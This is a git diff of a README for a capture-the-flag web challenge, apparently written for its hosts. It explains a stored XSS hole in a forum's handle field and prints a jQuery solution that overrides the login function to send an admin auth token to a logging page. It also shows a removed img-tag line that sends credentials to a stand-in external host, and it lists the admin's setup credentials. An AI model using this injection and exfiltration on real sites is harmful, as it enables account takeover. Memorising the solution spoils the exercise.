@@ -24,11 +24,14 @@ Present the code to one of the hosts to win!
 ## Detailed Problem
 The website is supposed to emulate a forum. Most forms of auth are secure *except* the `handle` which checks for `<script>` but not `<script src= . . .`. The challenger is supposed to inject some JS that replaces the login function with one that grabs the token or password. 
 
-### Recommendation at this point
-My BIGGEST recommendation is to use https://gist.github.com/. Once there they can make something called `c.js` and put some arbituary JS code in it. once there, use the **RAW** link as their handle and voila! Injected JS that they **CAN EDIT ACTIVELY**. This way if they break the site they can just change their code here to revert it.
+<s>### Recommendation at this point
+My BIGGEST recommendation is to use https://gist.github.com/. Once there they can make something called `c.js` and put some arbituary JS code in it. once there, use the **RAW** link as their handle and voila! Injected JS that they **CAN EDIT ACTIVELY**. This way if they break the site they can just change their code here to revert it.</s>
 
+Just have them inject code like the solution below.
 
-Once grabbed, it will then send it to a page that listens for any request and grabs the parameters. ( We might want to provide this ). To send it out, the easiest method is to bind it with an img tag. \<img src="https://mysecretwebsite.ioo/receive?user=admin&password=yadada&authToken=1234567">. 
+Once grabbed, it will then send it to a page that listens for any request and grabs the parameters. In this case they will send it to `Log.php`. Since it's local they won't need to do anything fancy. Just a jQuery GET request.
+the request will look like this `Log.php?data=whateveryouwantittobeandforittolog`.
+To get the last GET request, navigate to `Log.php` without the data tag to see it. 
 
 Once received, they emulate that same request on the web page and get the new page, an admin page that contains the number. It only works on verified login, so they can't bypass this any other way. 
 
@@ -100,3 +103,15 @@ to the `login` table, which exists in the `challenge` database.
 The above script includes the login credentials so you'll be good.
 
 As for the cron. go to the `cronadmin` folder and npm install. Have the cron run `node index.js` and ensure it works. If it doesn't, login as the admin to get an authtoken logged by going into the website and logging in as `thebestadmin` `securepassword1`. Once there it should create a file named `authTokenStorage.txt` which contains the authToken (I'm lazy, okay?)
+
+# Solution Script
+There exists `Log.php` which will aid them in repeating the last get request with a `data` parameter in it. 
+```
+authTokenLogin = function(authToken) {
+  $.get( "log.php?data=" + authToken, function( data ) {
+  });
+}
+```
+Using this will replace the authToken login and allow the user to get the data by going to `directory/log.php`
+
+Once that's done, they make the same request that authTokenLogin had previously to login as the admin!
